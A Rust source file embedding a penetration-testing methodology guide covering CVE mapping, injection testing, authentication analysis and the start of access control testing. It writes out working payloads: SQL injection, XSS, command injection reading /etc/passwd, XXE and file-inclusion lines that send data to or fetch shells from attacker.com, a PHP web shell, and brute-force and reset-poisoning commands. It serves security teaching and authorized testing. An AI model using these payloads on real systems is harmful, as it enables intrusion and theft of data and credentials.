pub const VULNERABILITY_ANALYSIS_STEPS: &[(&str, &str)] = &[
    (
        "Framework mapping to CVEs",
        "OBJECTIVE: Map identified technologies and versions to known Common Vulnerabilities and Exposures (CVEs) to assess security posture.

ACADEMIC BACKGROUND:
This step aligns with OWASP Testing Guide (WSTG-INFO-02: Fingerprint Web Server) and NIST SP 800-115 Section 7.3 (Vulnerability Scanning). The National Vulnerability Database (NVD) maintained by NIST provides comprehensive CVE data with CVSS scoring. MITRE ATT&CK T1190 (Exploit Public-Facing Application) emphasizes understanding vulnerability context. The PTES Technical Guidelines Section 3.5 details vulnerability analysis methodology.

STEP-BY-STEP PROCESS:

1. Compile Technology Inventory:
```bash
# Review reconnaissance findings for technology versions
cat technologies.txt | sort -u

# Example inventory format:
# Apache 2.4.41
# PHP 7.4.3
# WordPress 5.8.0
# Ubuntu 20.04 LTS
# OpenSSL 1.1.1f
```

2. Search National Vulnerability Database (NVD):
```bash
# Use NVD web interface: https://nvd.nist.gov/vuln/search
# Search by product name and version

# API access (requires key from https://nvd.nist.gov/developers/request-an-api-key):
curl \"https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=Apache+2.4.41\"

# Filter by severity:
# - Critical: CVSS 9.0-10.0
# - High: CVSS 7.0-8.9
# - Medium: CVSS 4.0-6.9
# - Low: CVSS 0.1-3.9
```

3. Search Exploit-DB and Local Database:
```bash
# Install searchsploit (part of ExploitDB):
sudo apt install exploitdb

# Search by application name:
searchsploit apache 2.4

# Search by CVE number:
searchsploit CVE-2021-41773

# Update database:
searchsploit -u

# Copy exploit to working directory:
searchsploit -m exploits/linux/webapps/50383.py

# Search with NMAP script:
nmap --script vuln target.com
```

4. Check Vendor Security Advisories:
```bash
# Apache Security: https://httpd.apache.org/security/vulnerabilities_24.html
# PHP Security: https://www.php.net/security/
# WordPress Security: https://wordpress.org/news/category/security/
# Ubuntu Security Notices: https://ubuntu.com/security/notices
# Red Hat Security Advisories: https://access.redhat.com/security/security-updates/

# Subscribe to security mailing lists:
# - oss-security@lists.openwall.com
# - full-disclosure@lists.grok.org.uk
# - bugtraq@securityfocus.com
```

5. Automated CVE Matching with CVE-Search:
```bash
# Install cve-search (local CVE database):
git clone https://github.com/cve-search/cve-search.git
cd cve-search
pip3 install -r requirements.txt

# Populate database (requires ~50GB disk):
./sbin/db_mgmt_json.py -p
./sbin/db_updater.py -v

# Search for CVEs:
./bin/search.py -p apache -v 2.4.41
./bin/search.py -c CVE-2021-41773
```

6. Analyze CVE Details and CVSS Scores:
```bash
# CVSS v3.1 scoring components:
# - Attack Vector (Network/Adjacent/Local/Physical)
# - Attack Complexity (Low/High)
# - Privileges Required (None/Low/High)
# - User Interaction (None/Required)
# - Scope (Unchanged/Changed)
# - Impact: Confidentiality/Integrity/Availability (None/Low/High)

# Example CVE analysis format:
# CVE-2021-41773: Apache HTTP Server 2.4.49 Path Traversal
# CVSS: 7.5 (High)
# Attack Vector: Network
# Complexity: Low
# Public Exploit: Yes (searchsploit apache 2.4.49)
# Affected Versions: 2.4.49, 2.4.50
# Patch: Upgrade to 2.4.51+
```

7. Verify Patch Status and Backported Fixes:
```bash
# Check installed package version:
dpkg -l | grep apache2
rpm -qa | grep httpd

# Check for backported security patches (Debian/Ubuntu):
apt-cache policy apache2
apt-cache show apache2 | grep CVE

# Check Red Hat/CentOS security errata:
yum updateinfo list security
yum updateinfo CVE-2021-41773

# Verify patch application:
strings /usr/sbin/apache2 | grep -i version
apache2 -v
```

8. Cross-Reference with Exploit Availability:
```bash
# Metasploit Framework search:
msfconsole -q -x \"search cve:2021-41773\"

# GitHub exploit search:
# https://github.com/search?q=CVE-2021-41773&type=repositories

# ExploitDB search:
searchsploit --cve CVE-2021-41773

# Packet Storm Security:
# https://packetstormsecurity.com/search/?q=CVE-2021-41773
```

9. Assess Exploitability in Target Environment:
```bash
# Factors affecting exploitability:
# - Network access (internal vs external)
# - Authentication requirements
# - Configuration dependencies
# - Defensive controls (WAF, IDS, patches)
# - Business criticality of affected system

# Document environmental factors:
echo \"System: webserver01.target.com
Technology: Apache 2.4.49
CVE: CVE-2021-41773 (Path Traversal)
CVSS: 7.5 High
Exploitability: HIGH (public exploit, no auth required)
Network Access: Internet-facing
Defensive Controls: None detected
Business Impact: CRITICAL (customer portal)
Recommendation: Immediate patching required\" > vuln_assessment.txt
```

10. Create Vulnerability Matrix:
```bash
# Spreadsheet format with columns:
# - Asset ID
# - Hostname/IP
# - Technology/Service
# - Version
# - CVE ID
# - CVSS Score
# - Severity
# - Exploit Available (Y/N)
# - Affected Component
# - Remediation
# - Priority
# - Status

# Example CSV:
echo \"Asset,Hostname,Technology,Version,CVE,CVSS,Severity,Exploit,Component,Remediation,Priority,Status
WEB-01,web01.target.com,Apache,2.4.49,CVE-2021-41773,7.5,High,Yes,HTTP Server,Upgrade to 2.4.51+,P1,Open
WEB-01,web01.target.com,OpenSSL,1.1.1,CVE-2022-0778,7.5,High,Yes,TLS Library,Upgrade to 1.1.1n+,P1,Open
DB-01,db01.target.com,MySQL,5.7.20,CVE-2021-2342,5.5,Medium,No,Optimizer,Upgrade to 5.7.35+,P2,Open\" > vulnerability_matrix.csv
```

WHAT TO LOOK FOR:
- **Critical Vulnerabilities (CVSS 9.0+)**: Remote code execution, authentication bypass, privilege escalation with public exploits
- **Exploitable High-Severity (CVSS 7.0-8.9)**: SQL injection, XSS, path traversal, information disclosure with PoC code
- **Zero-Day or Recent Disclosures**: CVEs published within last 30 days with active exploitation in the wild
- **End-of-Life Software**: Unsupported versions (e.g., Windows Server 2008, PHP 5.x, Apache 2.2.x) with no security updates
- **Chained Vulnerabilities**: Multiple medium-severity issues that combine for critical impact
- **Default Credentials**: Unchanged vendor passwords in databases, admin panels, network devices
- **Known Exploit Frameworks**: Metasploit modules, Exploit-DB entries, GitHub PoC repositories
- **Security Bulletin Mismatches**: Vendor claims patched but version numbers indicate vulnerable version

SECURITY IMPLICATIONS:
- **Immediate Risk**: Public exploits enable rapid compromise by both sophisticated attackers and script kiddies
- **Lateral Movement**: Vulnerabilities in internal systems facilitate network pivoting after initial access
- **Data Breach**: SQL injection and authentication bypass lead to unauthorized data access and exfiltration
- **Ransomware**: RCE vulnerabilities are primary vectors for ransomware deployment organizations
- **Compliance Impact**: Unpatched critical CVEs violate PCI DSS 6.2, HIPAA ยง164.308(a)(5), ISO 27001 A.12.6.1
- **Reputation Damage**: Public disclosure of exploitation can harm customer trust and brand value
- **Legal Liability**: Negligent patching practices may result in regulatory fines and lawsuits

COMMON PITFALLS:
- **False Positives**: Not all CVEs apply to specific configurations (e.g., Apache mod_proxy CVE when module disabled)
- **Version Confusion**: Linux distributions backport security patches without changing version numbers (Ubuntu, RHEL)
- **Exploit Prerequisites**: Some exploits require specific configurations, authentication, or network access not present in target
- **Vendor Disputes**: Some vendors disagree with CVSS scores or claim vulnerabilities are \"by design\" features
- **CPE Matching Errors**: Common Platform Enumeration (CPE) strings may not match vendor naming conventions
- **Patch Verification**: Systems may report patched but still vulnerable due to incomplete updates or rollback
- **Context Ignorance**: Internet-facing RCE is critical; internal-only with admin access required is lower priority
- **Automation Over-Reliance**: Scanners miss custom applications, business logic flaws, and zero-days

TOOLS REFERENCE:
- **NVD Search**: https://nvd.nist.gov/vuln/search (Official NIST vulnerability database)
- **searchsploit**: https://github.com/offensive-security/exploitdb (Local ExploitDB search)
- **cve-search**: https://github.com/cve-search/cve-search (Local CVE database with API)
- **Vulners**: https://vulners.com/ (Aggregated vulnerability intelligence)
- **VulnDB**: https://vuldb.com/ (Community vulnerability database)
- **Metasploit**: https://github.com/rapid7/metasploit-framework (Exploit framework with CVE modules)
- **Nmap NSE vuln**: https://nmap.org/nsedoc/categories/vuln.html (Vulnerability detection scripts)

FURTHER READING:
- NIST SP 800-115: Technical Guide to Information Security Testing and Assessment
- OWASP Testing Guide: https://owasp.org/www-project-web-security-testing-guide/
- CVSS v3.1 Specification: https://www.first.org/cvss/v3.1/specification-document
- MITRE ATT&CK T1190: https://attack.mitre.org/techniques/T1190/
- PTES Vulnerability Analysis: http://www.pentest-standard.org/index.php/Vulnerability_Analysis"
    ),
    (
        "Parameter testing",
        "OBJECTIVE: Test input parameters systematically for injection vulnerabilities including SQL injection, XSS, command injection, and other input validation flaws.

ACADEMIC BACKGROUND:
This step implements OWASP Top 10:2021 A03 (Injection) and OWASP Testing Guide WSTG-INPV series (Input Validation Testing). MITRE ATT&CK T1190 covers exploitation of injection vulnerabilities. The PTES Technical Guidelines Section 3.6 (Exploitation) emphasizes thorough parameter testing. SANS Top 25 CWE-89 (SQL Injection) and CWE-79 (XSS) are among the most dangerous software errors.

STEP-BY-STEP PROCESS:

1. SQL Injection Testing:
```bash
# Manual SQL injection test payloads:
# Basic error-based:
' OR '1'='1
\" OR \"1\"=\"1
' OR 1=1--
admin'--
' UNION SELECT NULL--

# Time-based blind SQL injection:
' AND SLEEP(5)--
'; WAITFOR DELAY '00:00:05'--
' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 AND SLEEP(5)--

# Automated SQLMap testing:
sqlmap -u \"https://target.com/page?id=1\" --batch --dbs

# Test POST parameters:
sqlmap -u \"https://target.com/login\" --data=\"username=admin&password=test\" --batch

# Test with cookie authentication:
sqlmap -u \"https://target.com/profile?id=1\" --cookie=\"PHPSESSID=abc123\" --batch

# Test all parameters:
sqlmap -u \"https://target.com/search?q=test&category=1\" --batch --level=5 --risk=3

# Enumerate database:
sqlmap -u \"https://target.com/page?id=1\" --batch --current-db
sqlmap -u \"https://target.com/page?id=1\" --batch -D database_name --tables
sqlmap -u \"https://target.com/page?id=1\" --batch -D database_name -T users --dump

# Read files from server:
sqlmap -u \"https://target.com/page?id=1\" --batch --file-read=\"/etc/passwd\"

# OS command execution (if database has privileges):
sqlmap -u \"https://target.com/page?id=1\" --batch --os-shell
```

2. Cross-Site Scripting (XSS) Testing:
```bash
# Reflected XSS payloads:
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
<iframe src=\"javascript:alert('XSS')\">

# Event handler XSS:
\" onmouseover=\"alert('XSS')
\" autofocus onfocus=\"alert('XSS')

# Bypass filters:
<scr<script>ipt>alert('XSS')</scr</script>ipt>
<script>alert(String.fromCharCode(88,83,83))</script>
<script>\\u0061lert('XSS')</script>

# DOM-based XSS (test in URL fragments):
https://target.com/page#<script>alert(document.cookie)</script>

# Stored XSS testing:
# Submit payloads in:
# - Comment fields
# - Profile information
# - Forum posts
# - File upload names
# - Search history

# XSS with XSStrike:
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
pip3 install -r requirements.txt
python3 xsstrike.py -u \"https://target.com/search?q=test\"

# Automated XSS with Dalfox:
dalfox url \"https://target.com/search?q=test\"
dalfox file urls.txt
```

3. Command Injection Testing:
```bash
# Basic command injection payloads:
; ls -la
| ls -la
& ls -la
&& ls -la
|| ls -la
` ls -la `
$(ls -la)

# Test with URL encoding:
%3B%20ls%20-la
%7C%20ls%20-la

# Time-based blind command injection:
; sleep 5
| ping -c 5 127.0.0.1
& timeout 5

# Test in various contexts:
# - Filename parameters
# - System diagnostic tools (ping, traceroute)
# - File processing commands
# - Email addresses in mail functions

# Example vulnerable parameter:
curl \"https://target.com/ping?host=127.0.0.1;cat%20/etc/passwd\"

# Automated command injection with Commix:
git clone https://github.com/commixproject/commix.git
cd commix
python3 commix.py --url=\"https://target.com/ping?host=INJECT_HERE\" --batch
```

4. LDAP Injection Testing:
```bash
# LDAP injection payloads (login forms):
*)(uid=*))(|(uid=*
*)(|(cn=*))
admin*
*)(objectClass=*)

# Example LDAP query construction:
# Vulnerable: (&(uid=$username)(password=$password))
# Payload: username=*)(uid=*))(|(uid=*
# Result: (&(uid=*)(uid=*))(|(uid=*)(password=test))

# Test in search functionality:
*
)(
*(|(objectClass=*
```

5. XPath Injection Testing:
```bash
# XPath injection payloads:
' or '1'='1
' or ''='
x' or 1=1 or 'x'='y
//*
//user[name/text()='admin' and password/text()='' or '1'='1']

# Test XML-based authentication systems
# Vulnerable XPath: //user[username='$user' and password='$pass']
```

6. NoSQL Injection Testing (MongoDB, CouchDB):
```bash
# MongoDB injection payloads:
{\"$ne\": null}
{\"$gt\": \"\"}
{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}

# URL encoded for GET requests:
username[$ne]=test&password[$ne]=test

# JSON POST request:
{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}

# Operator injection:
{\"$where\": \"sleep(5000)\"}
{\"username\": \"admin\", \"password\": {\"$regex\": \"^a\"}}

# NoSQLMap automated testing:
git clone https://github.com/codingo/NoSQLMap.git
cd NoSQLMap
python3 nosqlmap.py -u \"https://target.com/login\" --data \"username=admin&password=test\"
```

7. Server-Side Template Injection (SSTI):
```bash
# Detect template engines:
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
{{\"test\".toUpperCase()}}

# Jinja2 (Python Flask):
{{config.items()}}
{{''.__class__.__mro__[1].__subclasses__()}}

# Twig (PHP):
{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}

# Automated SSTI detection with tplmap:
git clone https://github.com/epinna/tplmap.git
cd tplmap
python3 tplmap.py -u \"https://target.com/page?name=test\"
```

8. XML External Entity (XXE) Injection:
```bash
# Basic XXE payload:
<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>
<root>&xxe;</root>

# Out-of-band XXE (exfiltrate data):
<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://attacker.com/?\">]>
<root>&xxe;</root>

# XXE with parameter entities:
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM \"file:///etc/passwd\">
<!ENTITY % wrapper \"<!ENTITY send SYSTEM 'http://attacker.com/?data=%xxe;'>\">
%wrapper;
]>

# Test in:
# - XML file uploads
# - SOAP requests
# - XML-based APIs
# - RSS/Atom feeds
# - SVG file uploads
```

9. File Inclusion Testing (LFI/RFI):
```bash
# Local File Inclusion (LFI) payloads:
../../../../etc/passwd
....//....//....//etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd
....\\\\....\\\\....\\\\windows\\\\win.ini

# PHP wrappers:
php://filter/convert.base64-encode/resource=index.php
php://filter/resource=/etc/passwd
data://text/plain,<?php system($_GET['cmd']); ?>
expect://ls

# Remote File Inclusion (RFI):
http://attacker.com/shell.txt
\\\\attacker.com\\share\\shell.php

# Automated LFI testing with LFISuite:
git clone https://github.com/D35m0nd142/LFISuite.git
cd LFISuite
python3 lfisuite.py
```

10. Parameter Pollution and Encoding Bypass:
```bash
# HTTP Parameter Pollution (HPP):
?id=1&id=2
?id=1&id[]=2
?id=1%00&id=2

# Double encoding:
%252e%252e%252f (../)
%2e%2e%2f

# Unicode encoding:
..%c0%af
..%e0%80%af

# Mixed case:
<ScRiPt>alert('XSS')</sCrIpT>

# Null byte injection:
file.php%00.jpg
/etc/passwd%00

# CRLF injection:
%0d%0aSet-Cookie: admin=true
```

WHAT TO LOOK FOR:
- **SQL Errors**: Database error messages revealing structure (\"MySQL syntax error\", \"ORA-00933\", \"ODBC drivers\")
- **XSS Reflection**: Input reflected in HTML without encoding, JavaScript contexts, HTML attributes
- **Command Output**: System command results (directory listings, /etc/passwd contents, whoami output)
- **LDAP Errors**: \"Invalid DN syntax\", \"Bad search filter\", authentication bypass with wildcard
- **NoSQL Behavior**: Empty password login success, regex-based enumeration, timing differences
- **Template Execution**: Mathematical expressions evaluated (49 instead of 7*7), config object access
- **XXE Success**: File contents in response, out-of-band HTTP requests to attacker server
- **File Inclusion**: Local file contents, remote code execution, configuration file disclosure

SECURITY IMPLICATIONS:
- **Data Breach**: SQL injection enables complete database extraction including credentials, PII, financial data
- **Session Hijacking**: XSS steals authentication cookies allowing account takeover
- **Remote Code Execution**: Command injection and file inclusion provide server-level access
- **Privilege Escalation**: Injection bypasses authentication and authorization controls
- **Lateral Movement**: Command execution enables reconnaissance and pivoting within network
- **Compliance Violations**: Injection vulnerabilities violate PCI DSS 6.5.1, OWASP ASVS 5.3, ISO 27001 A.14.2
- **Business Impact**: Website defacement, ransomware deployment, supply chain attacks

COMMON PITFALLS:
- **WAF Evasion Required**: Web Application Firewalls block obvious payloads; test with encoding, case manipulation
- **Context Matters**: XSS payloads differ for HTML body vs JavaScript vs HTML attributes vs URL parameters
- **Prepared Statements**: Modern frameworks use parameterized queries; SQL injection less common but test thoroughly
- **Authentication Required**: Some parameters only accessible after login; test authenticated and unauthenticated
- **Rate Limiting**: Aggressive testing triggers account lockout; use slow, methodical approach
- **False Positives**: Error messages may not indicate vulnerability; verify with proof-of-concept exploitation
- **Blind Injection**: No visible output requires time-based or out-of-band techniques
- **Tool Limitations**: Automated scanners miss custom encodings, logic-based injection, complex attack chains

TOOLS REFERENCE:
- **SQLMap**: https://github.com/sqlmapproject/sqlmap (Automated SQL injection)
- **XSStrike**: https://github.com/s0md3v/XSStrike (Advanced XSS detection)
- **Dalfox**: https://github.com/hahwul/dalfox (Fast XSS scanner)
- **Commix**: https://github.com/commixproject/commix (Command injection exploitation)
- **NoSQLMap**: https://github.com/codingo/NoSQLMap (NoSQL injection testing)
- **tplmap**: https://github.com/epinna/tplmap (Server-side template injection)
- **LFISuite**: https://github.com/D35m0nd142/LFISuite (Local file inclusion)
- **Burp Suite**: https://portswigger.net/burp (Manual parameter testing and fuzzing)

FURTHER READING:
- OWASP Testing Guide WSTG-INPV: https://owasp.org/www-project-web-security-testing-guide/
- OWASP Injection Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html
- PortSwigger Web Security Academy: https://portswigger.net/web-security/sql-injection
- SANS Top 25 CWE: https://www.sans.org/top25-software-errors/
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings"
    ),
    (
        "Authentication analysis",
        "OBJECTIVE: Evaluate the security of authentication mechanisms, session management, password policies, and multi-factor authentication implementations.

ACADEMIC BACKGROUND:
This step implements OWASP Top 10:2021 A07 (Identification and Authentication Failures) and OWASP Testing Guide WSTG-AUTHN series (Authentication Testing). MITRE ATT&CK T1078 (Valid Accounts) and T1110 (Brute Force) cover authentication attack patterns. NIST SP 800-63B provides digital identity authentication guidelines. PCI DSS Requirement 8 mandates strong authentication controls for cardholder data environments.

STEP-BY-STEP PROCESS:

1. Authentication Mechanism Identification:
```bash
# Identify authentication methods:
# - Form-based (username/password)
# - HTTP Basic/Digest authentication
# - OAuth 2.0 / OpenID Connect
# - SAML-based SSO
# - Certificate-based authentication
# - API keys / Bearer tokens
# - Biometric authentication
# - Multi-factor authentication (MFA)

# Test for authentication endpoints:
curl -I https://target.com/login
curl -I https://target.com/api/auth
curl -I https://target.com/oauth/authorize

# Check for authentication headers:
curl -v https://target.com/api -H \"Authorization: Bearer token\"
```

2. Password Policy Testing:
```bash
# Test weak password acceptance during registration:
# Minimum length: 1, 12345, password
# Complexity: nospecialchars, nocapitals, 123456
# Dictionary words: password, admin, company name
# Username as password: admin/admin

# Test password history enforcement:
# Reset password to previous password

# Test password expiration:
# Check if old passwords expire
# Verify forced password change intervals

# Test account lockout policy:
hydra -l admin -P /usr/share/wordlists/rockyou.txt https://target.com/login http-post-form \"/login:username=^USER^&password=^PASS^:F=Invalid\" -t 1 -w 5

# Document findings:
echo \"Password Policy Assessment:
- Min Length: 6 characters (WEAK - recommend 12+)
- Complexity: No requirements (WEAK - recommend upper+lower+digit+special)
- Lockout: 10 failed attempts (MEDIUM)
- Expiration: None (WEAK - recommend 90 days)
- History: Not enforced (WEAK)\" > password_policy.txt
```

3. Session Management Analysis:
```bash
# Inspect session cookies:
# Check for secure flags using browser dev tools

# Cookie security attributes:
Set-Cookie: SESSIONID=abc123; Secure; HttpOnly; SameSite=Strict; Path=/; Domain=.target.com

# Test session fixation:
# 1. Obtain session ID before authentication
# 2. Authenticate with valid credentials
# 3. Check if session ID changes after authentication
# 4. If unchanged, application is vulnerable to session fixation

# Test session timeout:
# 1. Authenticate and note session cookie
# 2. Wait 30+ minutes without activity
# 3. Attempt to access protected resource
# 4. Session should expire and require re-authentication

# Test concurrent sessions:
# 1. Login from Browser A
# 2. Login same user from Browser B
# 3. Check if Browser A session is still valid
# 4. System should invalidate previous session (single session enforcement)

# Session ID randomness test:
# Collect 100+ session IDs and analyze with Burp Sequencer
# Session IDs should be cryptographically random (128+ bits entropy)

# Test logout functionality:
curl -v https://target.com/logout -b \"SESSIONID=abc123\"
# Verify session invalidated server-side, not just client-side cookie deletion
```

4. Brute Force and Account Enumeration Testing:
```bash
# Username enumeration via timing attack:
time curl -X POST https://target.com/login -d \"username=validuser&password=wrong\" 
time curl -X POST https://target.com/login -d \"username=invaliduser&password=wrong\"
# Different response times may indicate username validity

# Username enumeration via response differences:
# Valid user: \"Invalid password\"
# Invalid user: \"User not found\" or \"Invalid credentials\"

# Password brute force with Hydra:
hydra -l admin -P /usr/share/wordlists/rockyou.txt https://target.com http-post-form \"/login:username=^USER^&password=^PASS^:S=Dashboard\"

# Credential stuffing with Burp Intruder:
# Use breach data from HaveIBeenPwned
# Test credential reuse across accounts

# Bypass rate limiting:
# X-Forwarded-For header manipulation
# Distributed testing from multiple IPs
# Test if lockout is per-user or per-IP

# CAPTCHA bypass testing:
# Check if CAPTCHA can be disabled
# Test CAPTCHA reuse
# Automated CAPTCHA solving services
```

5. Multi-Factor Authentication (MFA) Testing:
```bash
# MFA implementation review:
# - TOTP (Time-based One-Time Password - Google Authenticator)
# - SMS codes
# - Email codes
# - Hardware tokens (YubiKey, RSA SecurID)
# - Biometric authentication
# - Push notifications (Duo, Okta Verify)

# Test MFA bypass techniques:
# 1. Direct endpoint access (skip MFA page)
curl -v https://target.com/dashboard -b \"SESSIONID=abc123_without_mfa\"

# 2. Remember device functionality
# Check if \"trust this device\" can be abused

# 3. Backup codes validation
# Test if backup codes are single-use
# Check backup code complexity

# 4. MFA fatigue attacks (push notification spam)
# Send multiple push requests to user

# 5. SMS intercept (SIM swapping simulation)
# Document SS7 vulnerability risks

# 6. TOTP secret key exposure
# Check if QR code/secret visible in page source
# Verify secret key entropy and storage
```

6. OAuth/SAML/SSO Security Testing:
```bash
# OAuth 2.0 vulnerabilities:
# - Open redirect in redirect_uri
https://target.com/oauth/authorize?redirect_uri=https://attacker.com

# - CSRF in OAuth flow (missing state parameter)
# - Token leakage via Referer header
# - Implicit flow token exposure in URL fragments

# SAML assertion testing:
# - XML signature wrapping attacks
# - SAML response replay
# - Assertion recipient validation bypass
# - Comment injection in XML

# Test with SAMLReQuest interceptor:
git clone https://github.com/ernw/burpsuite-extensions.git
# Load SAML extension in Burp Suite

# SSO bypass techniques:
# - Force account linking
# - SSO provider enumeration
# - Account takeover via SSO misconfiguration
```

7. JSON Web Token (JWT) Security Analysis:
```bash
# Decode JWT (Header.Payload.Signature):
echo \"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.signature\" | cut -d'.' -f2 | base64 -d

# Test JWT vulnerabilities:
# 1. Algorithm confusion (RS256 โ HS256)
# Modify header: {\"alg\":\"HS256\"} instead of {\"alg\":\"RS256\"}

# 2. None algorithm acceptance
# Set header: {\"alg\":\"none\"} and remove signature

# 3. Weak secret key brute forcing:
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# 4. Kid (Key ID) injection:
# {\"alg\":\"HS256\",\"kid\":\"../../dev/null\"}

# Use jwt_tool for automated testing:
git clone https://github.com/ticarpi/jwt_tool.git
cd jwt_tool
python3 jwt_tool.py <JWT_TOKEN> -M at
```

8. Password Reset Functionality Testing:
```bash
# Test password reset vulnerabilities:
# 1. Token predictability
# Collect multiple reset tokens and analyze entropy

# 2. Token reuse
# Use same reset token twice

# 3. Token not expiring
# Wait 24+ hours and test old token

# 4. Token leak via Referer
# Click reset link, then navigate to external site
# Check if token leaked via HTTP Referer header

# 5. Account enumeration via reset
# Different responses for valid vs invalid users

# 6. Host header injection:
curl -X POST https://target.com/reset -H \"Host: attacker.com\" -d \"email=victim@target.com\"
# Check if reset link contains attacker.com

# 7. Password reset poisoning:
# Manipulate X-Forwarded-Host header
```

9. API Authentication Testing:
```bash
# Test API key security:
# - Keys in URL parameters (logged in proxies/browsers)
# - Weak key generation (predictable patterns)
# - Key enumeration and validation
# - Key not rotated regularly

# Test Bearer token security:
curl -H \"Authorization: Bearer <token>\" https://api.target.com/users

# Token validation bypass:
# - Remove Authorization header (anonymous access)
# - Use expired tokens
# - Modify token claims without re-signing

# API rate limiting bypass:
# - Missing rate limits per API key
# - Different limits per endpoint
# - Rate limit reset via IP rotation
```

10. Biometric Authentication Analysis:
```bash
# Biometric security considerations:
# - Fingerprint readers: Can be bypassed with lifted prints
# - Face recognition: Test with photos/videos
# - Voice recognition: Test with recordings
# - Behavioral biometrics: Pattern analysis

# Document biometric implementation:
# - Fallback authentication methods
# - Biometric data storage (local vs server)
# - Biometric template security
# - False acceptance rate (FAR) testing
```

WHAT TO LOOK FOR:
- **Weak Passwords Accepted**: No complexity requirements, common passwords allowed, short minimum length
- **Missing Cookie Flags**: Session cookies without Secure, HttpOnly, or SameSite attributes
- **Session Fixation**: Session ID unchanged after authentication
- **Inadequate Timeout**: Sessions valid for hours/days without activity
- **Username Enumeration**: Different error messages or timing for valid vs invalid usernames
- **Missing Account Lockout**: Unlimited authentication attempts without temporary blocks
- **MFA Bypass**: Direct access to protected resources without completing MFA
- **Weak JWT Secrets**: JWT tokens signed with dictionary words or weak keys
- **Password Reset Flaws**: Predictable tokens, token reuse, no expiration, account enumeration
- **OAuth/SAML Misconfigurations**: Open redirects, missing state validation, signature verification bypass

SECURITY IMPLICATIONS:
- **Account Takeover**: Weak authentication enables attackers to compromise user accounts
- **Credential Stuffing**: Password reuse from breaches grants access to organizational accounts
- **Session Hijacking**: Missing HttpOnly flag allows XSS to steal session cookies
- **Brute Force Success**: Weak lockout policies enable password guessing attacks
- **MFA Bypass**: Direct access undermines security benefits of multi-factor authentication
- **Compliance Violations**: Weak authentication violates PCI DSS 8.2, NIST 800-63B, GDPR Article 32
- **Lateral Movement**: Compromised credentials enable internal network access and privilege escalation

COMMON PITFALLS:
- **Third-Party Authentication**: OAuth/SAML handled by external providers (limited testing scope)
- **Internal vs External Controls**: Internal applications may have weaker authentication requirements
- **Framework Defaults**: Modern frameworks often implement secure session management by default
- **API vs Web Different**: API authentication may use different mechanisms than web interface
- **Rate Limiting Interference**: Aggressive testing may trigger lockouts and alert security teams
- **MFA Implementation Varies**: Push notifications, TOTP, SMS, hardware tokens have different security profiles
- **Legal Constraints**: Brute forcing production systems may violate policies or laws

TOOLS REFERENCE:
- **Hydra**: https://github.com/vanhauser-thc/thc-hydra (Brute force authentication)
- **Burp Suite**: https://portswigger.net/burp (Session analysis and JWT testing)
- **jwt_tool**: https://github.com/ticarpi/jwt_tool (JWT security testing)
- **Hashcat**: https://hashcat.net/hashcat/ (JWT secret brute forcing)
- **OWASP ZAP**: https://www.zaproxy.org/ (Automated authentication testing)

FURTHER READING:
- OWASP Testing Guide WSTG-AUTHN: https://owasp.org/www-project-web-security-testing-guide/
- NIST SP 800-63B: Digital Identity Guidelines (Authentication)
- OWASP Authentication Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html
- JWT Best Practices: https://tools.ietf.org/html/rfc8725
- PCI DSS Requirement 8: https://www.pcisecuritystandards.org/"
    ),
    (
        "Access control testing",
        "OBJECTIVE: Verify that authorization controls prevent users from accessing resources beyond their permissions through horizontal and vertical privilege escalation testing.

ACADEMIC BACKGROUND:
This step addresses OWASP Top 10:2021 A01 (Broken Access Control) and OWASP Testing Guide WSTG-ATHZ series (Authorization Testing). MITRE ATT&CK T1069 (Permission Groups Discovery) and T1548 (Abuse Elevation Control Mechanism) detail privilege escalation techniques. NIST SP 800-53 AC-3 mandates access enforcement controls. CWE-639 (Authorization Bypass) is a critical weakness class.

STEP-BY-STEP PROCESS:

1. Role and Permission Mapping:
```bash
# Document user roles and permissions:
# - Guest/Anonymous
# - Authenticated User
# - Power User/Manager
# - Administrator/Root

# Create test accounts for each role:
# user1@test.com (basic user)
# manager1@test.com (manager)
# admin@test.com (administrator)

# Map accessible endpoints per role:
curl -H \"Authorization: Bearer user_token\" https://api.target.com/users
curl -H \"Authorization: Bearer admin_token\" https://api.target.com/admin/users

# Document access control model:
# - Role-Based Access Control (RBAC)
# - Attribute-Based Access Control (ABAC)
# - Discretionary Access Control (DAC)
# - Mandatory Access Control (MAC)
```

2. Insecure Direct Object Reference (IDOR) Testing:
```bash
# Horizontal IDOR (access other users' data):
# User A (ID=100) authenticated:
curl -H \"Cookie: session=userA\" https://target.com/api/profile?user_id=100
curl -H \"Cookie: session=userA\" https://target.com/api/profile?user_id=101  # Try User B's ID

# Test different parameter formats:
/api/user/100
/api/user?id=100
/api/user/profile/100
/user/MTAw  # Base64 encoded 100
/user/0x64  # Hexadecimal 100

# Mass enumeration:
for i in {1..1000}; do
    curl -s -H \"Cookie: session=userA\" \"https://target.com/api/invoice?id=$i\" | grep -i \"success\"
done

# UUID IDOR testing:
# Even with UUIDs, test if authorization is checked:
curl -H \"Cookie: session=userA\" https://target.com/api/document/a1b2c3d4-e5f6-7g8h-9i0j-k1l2m3n4o5p6

# Automated IDOR testing with Burp Autorize extension:
# https://github.com/PortSwigger/autorize
```

3. Vertical Privilege Escalation Testing:
```bash
# Test administrative functionality as regular user:
# Capture admin requests in Burp Suite, replay with user session

# Common admin endpoints to test:
